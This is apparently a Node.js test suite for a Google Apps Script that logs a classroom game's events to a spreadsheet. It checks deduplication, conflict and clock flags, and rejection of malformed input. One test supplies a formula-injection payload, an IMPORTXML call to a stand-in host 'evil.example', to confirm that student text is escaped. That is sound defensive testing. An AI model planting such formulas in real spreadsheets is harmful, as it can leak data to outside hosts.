import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { CONFIG } from '../src/scenario.mjs';
import { makeRoom, marketForTable, validateRecord } from '../src/rules.mjs';
import { buildEvents } from '../src/sync.mjs';

// Run the Apps Script file as Google does: plain script, no modules, with the Google services stubbed.
const source = readFileSync(new URL("../integrations/google-sheets/Code.gs", import.meta.url), "utf8");

function load(extra = {}) {
  const context = vm.createContext({Date, JSON, Math, Number, String, Array, Object, isFinite, ...extra});
  vm.runInContext(source, context, {filename: "Code.gs"});
  return context;
}

const start = Date.parse("2026-11-14T18:30:00+03:00");
const room = makeRoom(start, 0, "ABC");
const at = minutes => new Date(start + minutes * 60_000).toISOString();
function events(overrides = []) {
  const history = [
    {round: "R1", choice: "A", method: "submitted", at: at(5), evidence: "e1", tradeoff: "t1"},
    {round: "R2", choice: "desk", method: "default", at: at(32), evidence: "", tradeoff: ""},
    ...overrides
  ];
  return buildEvents(validateRecord({game: CONFIG.game, version: CONFIG.version, mode: "live", team: 2, market: marketForTable(room, 2), room, session: "s", history, drafts: {}, notes: {}, brief: "", bulletinB: false}));
}
const payload = (list, sentAt = new Date(start)) => ({v: 1, sentAt: sentAt.toISOString(), clockOffsetMs: 4000, events: list});
const empty = () => ({ids: {}, chains: {}});

test("Events produced by the game are accepted as rows with one value per column", () => {
  const code = load();
  const now = new Date(start);
  const result = code.accept(payload(events()), empty(), now);
  assert.equal(result.saved.length, 2);
  assert.equal(result.rows.length, 2);
  assert.ok(result.rows.every(row => row.length === code.COLUMNS.length));
  const [row] = result.rows;
  assert.equal(row[code.COLUMNS.indexOf("received_at")], now, "Google's clock stamps the row");
  assert.equal(row[code.COLUMNS.indexOf("round")], "R1");
  assert.equal(row[code.COLUMNS.indexOf("flags")], "");
  assert.equal(row[code.COLUMNS.indexOf("clock_offset_s")], 4);
});

test("A repeated or re-sent event is reported as a duplicate and stored once", () => {
  const code = load();
  const list = events();
  const first = code.accept(payload(list), empty(), new Date(start));
  const existing = {ids: Object.fromEntries(first.saved.map(id => [id, true])), chains: {}};
  const again = code.accept(payload(list), existing, new Date(start));
  assert.equal(again.rows.length, 0);
  assert.deepEqual([...again.duplicates], list.map(event => event.id));
  const doubled = code.accept(payload([list[0], list[0]]), empty(), new Date(start));
  assert.equal(doubled.rows.length, 1);
  assert.equal(doubled.duplicates.length, 1);
});

test("Rewriting a recorded round adds a new row flagged CONFLICT instead of replacing the old one", () => {
  const code = load();
  const honest = events();
  const first = code.accept(payload(honest), empty(), new Date(start));
  const chains = Object.fromEntries(first.rows.map(row => [row[2] + "|" + row[3] + "|" + row[5], row[16]]));
  const forged = events([]).map((event, index) => index === 1 ? {...event, choice: "prototype", chain: "zzzzzzzzzzz", id: event.id.replace(/[0-9a-z]{11}$/, "zzzzzzzzzzz")} : event);
  const result = code.accept(payload([forged[1]]), {ids: {}, chains}, new Date(start));
  assert.equal(result.rows.length, 1);
  assert.match(result.rows[0][code.COLUMNS.indexOf("flags")], /CONFLICT/);
});

test("A device clock far from Google is flagged", () => {
  const code = load();
  const result = code.accept(payload(events(), new Date(start - 10 * 60_000)), empty(), new Date(start));
  assert.match(result.rows[0][code.COLUMNS.indexOf("flags")], /CLOCK/);
});

test("Student text can never become a spreadsheet formula", () => {
  const code = load();
  const [event] = events();
  const nasty = {...event, evidence: '=IMPORTXML("https://evil.example","//x")', tradeoff: "+SUM(1)", label: "@cmd"};
  const [row] = code.accept(payload([nasty]), empty(), new Date(start)).rows;
  for (const column of ["evidence", "tradeoff", "label"]) assert.ok(row[code.COLUMNS.indexOf(column)].startsWith("'"), column);
  const long = code.accept(payload([{...event, evidence: "x".repeat(5000)}]), empty(), new Date(start)).rows[0];
  assert.equal(long[code.COLUMNS.indexOf("evidence")].length, 1800);
});

test("Malformed events are rejected one by one without failing the request", () => {
  const code = load();
  const [good, second] = events();
  const bad = [
    {...good, room: "NOPE"}, {...good, team: 9}, {...good, round: "R9"}, {...good, method: "cheat"},
    {...good, seq: 3}, {...good, chain: "short"}, {...good, id: "other:1:0:abcdefghijk"}, null
  ];
  const result = code.accept(payload([...bad, second]), empty(), new Date(start));
  assert.equal(result.rejected.length, bad.length);
  assert.equal(result.saved.length, 1);
  assert.throws(() => code.accept({v: 2, events: [good]}, empty(), new Date()), /Unsupported/);
  assert.throws(() => code.accept(payload([]), empty(), new Date()), /Unsupported/);
  assert.throws(() => code.accept(payload(Array(21).fill(good)), empty(), new Date()), /Unsupported/);
});

test("doPost appends to the sheet under a lock, answers with JSON and tolerates a re-send", () => {
  const data = [];
  let released = 0;
  const fakeSheet = {
    getLastRow: () => data.length,
    getRange: (row, column, count) => ({
      setValues: values => { data.splice(row - 1, values.length, ...values); return {setFontWeight() {}}; },
      getValues: () => data.slice(row - 1, row - 1 + count)
    }),
    setFrozenRows() {}
  };
  const rows = {get length() { return Math.max(0, data.length - 1); }};
  const spreadsheet = {getSheetByName: () => fakeSheet, insertSheet: () => fakeSheet};
  const code = load({
    LockService: {getScriptLock: () => ({waitLock() {}, releaseLock() { released++; }})},
    SpreadsheetApp: {getActiveSpreadsheet: () => spreadsheet},
    ContentService: {MimeType: {JSON: "json"}, createTextOutput: body => ({body, setMimeType() { return this; }})}
  });
  const request = {postData: {contents: JSON.stringify(payload(events(), new Date()))}};
  const first = JSON.parse(code.doPost(request).body);
  assert.equal(first.ok, true);
  assert.equal(first.saved.length, 2);
  assert.equal(rows.length, 2);
  const second = JSON.parse(code.doPost(request).body);
  assert.equal(second.saved.length, 0);
  assert.equal(second.duplicates.length, 2);
  assert.equal(rows.length, 2);
  assert.equal(released, 2);

  const broken = JSON.parse(code.doPost({postData: {contents: "not json"}}).body);
  assert.equal(broken.ok, false);
  assert.equal(released, 3, "the lock is always released");
  assert.equal(JSON.parse(code.doGet().body).service, "one-market-first");
});
